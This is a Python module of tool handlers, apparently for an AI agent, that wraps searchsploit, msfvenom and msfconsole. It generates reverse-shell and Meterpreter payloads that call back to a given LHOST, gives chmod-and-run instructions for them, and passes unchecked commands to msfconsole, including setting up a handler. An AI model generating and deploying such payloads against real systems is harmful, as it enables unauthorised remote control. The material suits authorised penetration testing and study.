"""
Exploitation Tool Handlers
==========================

Handles: searchsploit, msfvenom, msfconsole
"""
from typing import Dict, Any
from app.tools.handlers import register_handler
import subprocess
import json


@register_handler("searchsploit")
def handle_searchsploit(action_input: Dict[str, Any], state: Any) -> str:
    """Search Exploit-DB for known exploits."""
    query = action_input.get("query", "")
    if not query:
        return "Error: No query specified. Example: searchsploit with {\"query\": \"apache 2.4\"}"
    
    print(f"  üîç Searching exploits for: {query}...")
    
    try:
        result = subprocess.run(
            ["searchsploit", query, "--json"],
            capture_output=True,
            text=True,
            timeout=60
        )
        
        try:
            data = json.loads(result.stdout)
            exploits = data.get("RESULTS_EXPLOIT", [])
            
            output = f"‚ïê‚ïê‚ïê SEARCHSPLOIT: {query} ‚ïê‚ïê‚ïê\n"
            output += f"Found {len(exploits)} exploits\n\n"
            
            for exp in exploits[:15]:
                output += f"[{exp.get('Type', 'Unknown')}] {exp.get('Title', '')}\n"
                output += f"  Path: {exp.get('Path', '')}\n"
            
            if len(exploits) > 15:
                output += f"\n... and {len(exploits) - 15} more\n"
            
            return output
            
        except json.JSONDecodeError:
            return f"Searchsploit output:\n{result.stdout[:2000]}"
            
    except FileNotFoundError:
        return "‚ö†Ô∏è searchsploit not installed. Install: sudo apt install exploitdb"
    except subprocess.TimeoutExpired:
        return "Searchsploit timed out"
    except Exception as e:
        return f"Searchsploit error: {e}"


@register_handler("msfvenom")
def handle_msfvenom(action_input: Dict[str, Any], state: Any) -> str:
    """Generate payloads with msfvenom."""
    payload = action_input.get("payload", "")
    lhost = action_input.get("lhost", "")
    lport = action_input.get("lport", "4444")
    fmt = action_input.get("format", "elf")
    output_file = action_input.get("output", f"/tmp/payload_{lport}.{fmt}")
    
    if not payload:
        return """Error: payload is required. Examples:
  msfvenom with {"payload": "linux/x64/shell_reverse_tcp", "lhost": "10.0.0.1", "lport": "4444"}
  msfvenom with {"payload": "windows/meterpreter/reverse_tcp", "lhost": "10.0.0.1", "format": "exe"}
  
Common payloads:
  - linux/x64/shell_reverse_tcp
  - linux/x86/meterpreter/reverse_tcp
  - windows/meterpreter/reverse_tcp
  - windows/x64/shell_reverse_tcp
  - php/reverse_php"""
    
    if not lhost:
        return "Error: lhost is required. Example: msfvenom with {\"payload\": \"...\", \"lhost\": \"10.0.0.1\"}"
    
    print(f"  üîß Generating payload: {payload}...")
    
    try:
        result = subprocess.run(
            ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", fmt, "-o", output_file],
            capture_output=True,
            text=True,
            timeout=120
        )
        
        if result.returncode == 0:
            return f"""‚ïê‚ïê‚ïê PAYLOAD GENERATED ‚ïê‚ïê‚ïê
Payload: {payload}
LHOST: {lhost}
LPORT: {lport}
Format: {fmt}
Output: {output_file}

Use: chmod +x {output_file} && ./{output_file.split('/')[-1]}"""
        else:
            return f"msfvenom error:\n{result.stderr}"
            
    except FileNotFoundError:
        return "‚ö†Ô∏è msfvenom not installed. Install: sudo apt install metasploit-framework"
    except subprocess.TimeoutExpired:
        return "msfvenom timed out"
    except Exception as e:
        return f"msfvenom error: {e}"


@register_handler("msfconsole")
def handle_msfconsole(action_input: Dict[str, Any], state: Any) -> str:
    """Run Metasploit console command."""
    command = action_input.get("command", "")
    
    if not command:
        return """Error: command is required. Examples:
  msfconsole with {"command": "search apache"}
  msfconsole with {"command": "use exploit/multi/handler"}
  msfconsole with {"command": "show exploits"}"""
    
    print(f"  üî¥ Running msfconsole: {command}...")
    
    try:
        result = subprocess.run(
            ["msfconsole", "-q", "-x", f"{command}; exit"],
            capture_output=True,
            text=True,
            timeout=120
        )
        
        return f"‚ïê‚ïê‚ïê MSFCONSOLE ‚ïê‚ïê‚ïê\n{result.stdout[:3000]}"
        
    except FileNotFoundError:
        return "‚ö†Ô∏è msfconsole not installed. Install: sudo apt install metasploit-framework"
    except subprocess.TimeoutExpired:
        return "msfconsole timed out"
    except Exception as e:
        return f"msfconsole error: {e}"
